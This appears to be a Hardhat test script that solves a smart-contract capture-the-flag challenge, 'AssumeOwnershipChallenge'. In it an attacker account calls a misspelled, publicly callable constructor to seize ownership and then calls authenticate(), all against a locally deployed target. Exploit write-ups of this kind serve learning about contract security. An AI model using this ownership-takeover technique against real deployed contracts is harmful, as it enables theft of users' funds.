import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { network, ethers } from 'hardhat';

describe('AssumeOwnershipChallenge', () => {
  let target: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const targetFactory = await ethers.getContractFactory('AssumeOwnershipChallenge');

    target = await targetFactory.deploy();

    await target.deployed();

    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    let tx;

    // The constructor was misspelled
    tx = await target.connect(attacker).AssumeOwmershipChallenge();
    await tx.wait();

    tx = await target.connect(attacker).authenticate();
    await tx.wait();
  });

  after(async () => {
    expect(await target.isComplete()).to.equal(true);
  });
});
